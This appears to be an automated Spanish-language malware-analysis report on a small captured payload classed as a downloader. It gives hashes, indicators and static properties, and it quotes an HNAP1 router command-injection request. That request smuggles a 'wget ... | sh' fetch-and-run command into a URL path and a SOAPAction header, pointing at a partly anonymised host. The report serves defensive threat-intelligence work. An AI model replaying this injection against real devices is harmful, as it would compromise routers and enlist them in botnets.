# 🧬 Payload Analysis

`a1d549856ad12170b71dc46649fdc072d0640925b8266effb0e69685f3637437`

## 📌 Resumen

Texto ASCII de 476 B. La evidencia disponible identifica capacidad de descarga remota. Recurso remoto principal: `wget.sh` en `hxxp://91.92.40.XXX/wget.sh`. **Comandos observados o extraídos, en orden de aparición en la evidencia:**

1. `wget hxxp://91.92.40.XXX/wget.sh -O-`
2. `sh -s dhnap2`
3. `busybox wget hxxp://91.92.40.XXX` Los comandos se presentan como evidencia observada o extraída; no se afirma ejecución salvo que la relación registrada sea `executed`. **Perfil técnico:** `Linux / BusyBox`, compatible con sistemas embebidos o IoT. BusyBox se trata como indicio de plataforma y no como prueba suficiente de que el dispositivo sea IoT. **Ficha malware:** [malware-like/oraculo/downloader/a1d549856ad12170b71dc46649fdc072d0640925b8266effb0e69685f3637437.md](../../../../../malware-like/oraculo/downloader/a1d549856ad12170b71dc46649fdc072d0640925b8266effb0e69685f3637437.md)


## 🏷️ Clasificación

- **Categoría:** `Downloader / Dropper`
- **Confianza:** `Baja`
- **Riesgo:** `Medium`

## 🗓️ Registro

- **Registrado:** `2026-08-09T19:45:45.000000Z`
- **Tipo de registro:** `snapshot inmutable`

## 🔐 Identidad

- **SHA256:** `a1d549856ad12170b71dc46649fdc072d0640925b8266effb0e69685f3637437`
- **MD5:** `c90d2ce465f15299a88ba0bc8b0b4c95`

## 🧪 Análisis estático

| Propiedad | Resultado |
| --- | --- |
| Descripción | ASCII text, with CRLF line terminators |
| Tamaño | 476 B |
| Entropía | 5.11 |
| Strings | 4 |

## 🧠 Comportamiento observado

1. **Descarga remota**
2. **Ejecución**

## 🔬 Evidencia de clasificación

- Capacidad detectada: Descarga remota
- Motivos técnicos: mime=ASCII text, with CRLF line terminators; iocs=7

## 🖥️ Comandos observados / extraídos

```text
GET /HNAP1/GetDeviceSettings/`cd /tmp;wget hxxp://91.92.40.XXX/wget.sh -O-|sh -s dhnap2;busybox wget hxxp://91.92.40.XXX
SOAPAction: "hxxp://purenetworks[.]com/HNAP1/GetDeviceSettings/`cd /tmp;wget hxxp://91.92.40.XXX/wget.sh -O-|sh -s dhnap2;
```

## 🌐 Indicadores

| Tipo | Valor | Contexto |
| --- | --- | --- |
| url | hxxp://91.92.40.XXX/wget.sh | strings |
| url | hxxp://purenetworks[.]com/HNAP1/GetDeviceSettings/ | strings |
| ip | 190.179.168.XXX | static_analysis |
| ip | 91.92.40.XXX | static_analysis |
| command | GET /HNAP1/GetDeviceSettings/`cd /tmp;wget hxxp://91.92.40.XXX/wget.sh -O-\|sh -s dhnap2;busybox wget hxxp://91.92.40.XXX | strings |
| command | SOAPAction: "hxxp://purenetworks[.]com/HNAP1/GetDeviceSettings/`cd /tmp;wget hxxp://91.92.40.XXX/wget.sh -O-\|sh -s dhnap2; | strings |
| hash | a1d549856ad12170b71dc46649fdc072d0640925b8266effb0e69685f3637437 | static_analysis |
| ip | 45.156.87.XXX | artifact_source |

## 🛡️ Nota de publicación

Este informe conserva una **fotografía del estado de análisis en la fecha de registro**. No se mantienen campos temporales de observación ni contadores vivos.

Las IPv4 públicas se anonimizaron como `A.B.C.XXX`; las direcciones internas, credenciales, tokens y otros secretos se redactan antes de publicar.
